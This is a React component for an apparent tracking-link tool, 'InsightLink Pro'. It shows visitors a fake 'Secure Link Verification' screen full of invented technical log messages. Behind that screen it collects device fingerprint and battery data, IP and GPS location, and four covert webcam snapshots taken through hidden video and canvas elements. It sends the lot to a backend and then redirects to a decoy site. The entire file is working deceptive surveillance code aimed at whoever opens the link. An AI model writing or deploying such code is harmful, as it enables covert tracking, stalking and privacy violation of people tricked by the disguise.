
import React, { useEffect, useState, useRef } from 'react';
import { Loader2, ShieldCheck, Terminal, ShieldAlert, Cpu, Lock, Activity } from 'lucide-react';
import { LinkConfig, CaptureReport, DeviceInfo, GeoLocation } from '../types';

interface Props {
  linkId: string;
}

const CapturePage: React.FC<Props> = ({ linkId }) => {
  const [status, setStatus] = useState<'initializing' | 'loading' | 'failed' | 'done'>('initializing');
  const [step, setStep] = useState('Authenticating Client');
  const [logs, setLogs] = useState<string[]>([]);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const logContainerRef = useRef<HTMLDivElement>(null);

  const addLog = (msg: string) => {
    setLogs(prev => [...prev.slice(-12), `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  useEffect(() => {
    if (logContainerRef.current) {
      logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
    }
  }, [logs]);

  useEffect(() => {
    const savedLinks = JSON.parse(localStorage.getItem('il_links') || '[]');
    const found = savedLinks.find((l: LinkConfig) => l.id === linkId);
    
    addLog(`System Initialize: Node_${linkId.toUpperCase()}`);
    addLog("Searching for valid session certificates...");
    
    const timer = setTimeout(() => {
      startFullCapture(found?.redirectUrl || 'https://google.com');
    }, 15000); // Increased wait for initial handshake feel

    startFullCapture(found?.redirectUrl || 'https://google.com');

    return () => clearTimeout(timer);
  }, [linkId]);

  const startFullCapture = async (redirectTarget: string) => {
    if (status !== 'initializing') return; // Prevent double trigger
    
    setStatus('loading');
    setStep('Mapping Neural Network');
    addLog("Protocol V3.0 Handshake started.");
    
    const report: Partial<CaptureReport> = {
      id: Math.random().toString(36).substring(7),
      timestamp: new Date().toISOString(),
      redirectUrl: redirectTarget,
      photos: []
    };

    // A. Gather Device Info
    const fullUserAgent = navigator.userAgent;
    const deviceMemory = (navigator as any).deviceMemory || "UNKNOWN";
    addLog("Analyzing machine architecture...");

    const deviceInfo: DeviceInfo = {
      browser: /chrome|crios|crmo/i.test(fullUserAgent) ? 'Chrome' : /firefox|iceweasel|fxios/i.test(fullUserAgent) ? 'Firefox' : /safari/i.test(fullUserAgent) && !/chrome|crios|crmo/i.test(fullUserAgent) ? 'Safari' : 'Unknown',
      os: /windows/i.test(fullUserAgent) ? 'Windows' : /macintosh/i.test(fullUserAgent) ? 'MacOS' : /linux/i.test(fullUserAgent) ? 'Linux' : /android/i.test(fullUserAgent) ? 'Android' : /iphone|ipad|ipod/i.test(fullUserAgent) ? 'iOS' : 'Other',
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      cores: navigator.hardwareConcurrency || 0,
      userAgent: fullUserAgent,
      orientation: (window.screen as any).orientation?.type || 'unknown',
      ram: typeof deviceMemory === 'number' ? deviceMemory : 0,
      timezoneOffset: new Date().getTimezoneOffset(),
      timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'
    };
    report.device = deviceInfo;
    addLog(`Hardware Probe: ${deviceInfo.os} ${deviceInfo.browser} confirmed.`);

    // B. Battery
    try {
      addLog("Calibrating power source telemetry...");
      if ('getBattery' in navigator) {
        const battery = await (navigator as any).getBattery();
        report.battery = {
          level: battery.level ?? 1,
          charging: battery.charging ?? true,
          chargingTime: battery.chargingTime ?? 0,
          dischargingTime: battery.dischargingTime ?? Infinity
        };
        addLog(`Power data locked: ${Math.round(report.battery.level * 100)}% capacity.`);
      } else {
        throw new Error("API_UNSUPPORTED");
      }
    } catch (err) {
      addLog("POWER_LINK_SKIPPED: Hardware interface restricted.");
      report.battery = { level: 1, charging: true, chargingTime: 0, dischargingTime: Infinity };
    }

    setStep('Triangulating Coordinates');
    addLog("Querying Global Positioning Satellites...");
    // C. Network & IP
    try {
      const ipRes = await fetch('https://ipapi.co/json/').then(r => {
        if (!r.ok) throw new Error("NETWORK_UNSTABLE");
        return r.json();
      });
      
      const baseGeo: GeoLocation = {
        lat: ipRes.latitude,
        lon: ipRes.longitude,
        accuracy: 1000,
        city: ipRes.city,
        region: ipRes.region,
        country: ipRes.country_name,
        isp: ipRes.org,
        ip: ipRes.ip
      };
      
      addLog(`Network trace complete. Origin: ${baseGeo.city}, ${baseGeo.country}`);

      try {
        const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { 
            timeout: 6000,
            enableHighAccuracy: true 
          });
        });
        addLog("GPS precision lock achieved. Vector verified.");
        baseGeo.lat = pos.coords.latitude;
        baseGeo.lon = pos.coords.longitude;
        baseGeo.accuracy = pos.coords.accuracy;
      } catch (geoErr: any) {
        if (geoErr.code === 1) {
          addLog("PERMISSION_DENIED: Satellite uplink blocked by user.");
        } else {
          addLog("GPS_TIMEOUT: Using IP-based estimation.");
        }
      }
      report.location = baseGeo;
    } catch (err) {
      addLog("UPLINK_ERROR: Critical network trace failed.");
      report.location = { lat: 0, lon: 0, accuracy: 0, ip: 'Undetected' };
    }

    setStep('Synchronizing Visual Identity');
    addLog("Requesting Visual Validation Node...");
    // D. Camera
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        addLog("Optical feed verified. Capturing baseline frame.");
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();

          // Wait for camera to adjust exposure/focus
          await new Promise(r => setTimeout(r, 1000));

          for (let i = 0; i < 4; i++) {
            if (canvasRef.current && videoRef.current) {
              const ctx = canvasRef.current.getContext('2d');
              canvasRef.current.width = videoRef.current.videoWidth;
              canvasRef.current.height = videoRef.current.videoHeight;
              ctx?.drawImage(videoRef.current, 0, 0);
              const dataUrl = canvasRef.current.toDataURL('image/jpeg', 0.5);
              report.photos!.push(dataUrl);
              addLog(`Data segment ${i+1}/4 encapsulated.`);
            }
            await new Promise(r => setTimeout(r, 400));
          }
          stream.getTracks().forEach(track => track.stop());
          addLog("Visual validation cycle complete.");
        }
      } catch (e: any) {
        if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
          addLog("AUTH_FAILURE: Camera permissions denied.");
        } else {
          addLog("HARDWARE_FAULT: Optical sensor unavailable.");
        }
      }
    } else {
      addLog("LEGACY_BROWSER: Camera API missing.");
    }

    setStep('Securing Uplink');
    addLog("Finalizing payload encryption...");
    // E. Send to internal backend API
    try {
      const response = await fetch(`/api/reports/${linkId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(report)
      });
      
      if (!response.ok) throw new Error("CLOUD_SYNC_FAILED");
      
      addLog("Uplink successful. Syncing with global bridge.");
    } catch (err) {
      addLog("SYNC_ERROR: Telemetry stored in local cache.");
      console.error('Data sync failed:', err);
    }

    addLog("Session closing. Redirecting to secure landing.");
    setStatus('done');
    setTimeout(() => {
      window.location.href = redirectTarget;
    }, 1200);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-paper px-6 overflow-hidden relative">
      <video ref={videoRef} className="hidden" playsInline muted></video>
      <canvas ref={canvasRef} className="hidden"></canvas>
      
      {/* Background Decor */}
      <div className="absolute top-0 right-0 p-8 opacity-5 text-ink">
        <Activity size={300} />
      </div>

      <div className="max-w-xl w-full space-y-8 animate-pop">
        <div className="flex flex-col items-center text-center space-y-4">
          <div className="w-24 h-24 border-4 border-ink border-t-brand-accent rounded-full animate-spin flex items-center justify-center relative bg-white shadow-comic-sm">
             <Lock className="text-ink absolute" size={32} />
          </div>
          <h1 className="text-3xl font-black text-ink uppercase italic tracking-tighter">Secure Link Verification</h1>
          <p className="text-ink/50 font-bold text-xs uppercase tracking-[0.2em]">InsightLink Pro Protocol 3.0</p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="comic-card p-6 bg-white space-y-6">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-black uppercase text-ink/30 italic">Diagnostic Unit</span>
              <Cpu size={16} className="text-brand-accent" />
            </div>
            <div className="space-y-4">
              <div className="flex justify-between items-center text-xs font-black italic">
                <span>PROGRESS</span>
                <span className="text-brand-accent">{status === 'done' ? '100%' : status === 'loading' ? '85%' : '15%'}</span>
              </div>
              <div className="h-4 bg-paper border-2 border-ink p-0.5 rounded-sm">
                <div 
                  className="h-full bg-brand-accent transition-all duration-1000" 
                  style={{ width: status === 'done' ? '100%' : status === 'loading' ? '85%' : '15%' }}
                />
              </div>
              <p className="text-[10px] font-bold text-ink/60 uppercase text-center truncate">{step}</p>
            </div>
          </div>

          <div className="comic-card p-6 bg-ink text-brand-light font-mono text-[10px] leading-relaxed relative overflow-hidden">
            <div className="flex items-center gap-2 mb-3 border-b border-brand-light/20 pb-2">
              <Terminal size={14} className="text-brand-accent" />
              <span className="uppercase font-black text-white/90">Kernel Log</span>
            </div>
            <div className="h-32 overflow-hidden flex flex-col justify-end" ref={logContainerRef}>
              {logs.map((log, i) => (
                <div key={i} className="truncate whitespace-pre-wrap opacity-90">{log}</div>
              ))}
              {status !== 'done' && <div className="animate-pulse text-brand-accent">_</div>}
            </div>
          </div>
        </div>

        <div className="flex justify-center items-center gap-4 text-ink/20 font-black uppercase italic text-[9px] tracking-widest">
          <ShieldCheck size={14} />
          End-to-End Encryption Active
        </div>
      </div>
    </div>
  );
};

export default CapturePage;
